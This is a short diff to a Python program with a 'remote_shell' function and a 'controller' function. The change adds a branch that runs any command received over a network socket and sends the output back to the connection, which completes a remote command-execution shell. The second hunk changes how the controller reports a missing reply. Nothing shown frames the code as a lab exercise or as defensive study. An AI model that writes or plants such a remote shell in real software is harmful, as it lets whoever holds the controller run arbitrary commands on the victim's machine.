@@ -46,6 +46,12 @@ def remote_shell(conn):
                 os.chdir(commands[1])
                 new_dir = os.getcwd()
                 conn.send(new_dir.encode())
+            else:
+                execution = subprocess.run(commands, capture_output=True)
+                if execution.stdout:
+                    conn.send(execution.stdout)
+                else:
+                    conn.send(b'error')
         else:
             print('Client disconnected')
             sel.unregister(conn)
@@ -72,7 +78,7 @@ def controller():
             if msg:
                 print(msg.decode())
             else:
-                client_connup = False
+                print('No reply')
     except ConnectionRefusedError:
         print('CONNECTION REFUSED')
 
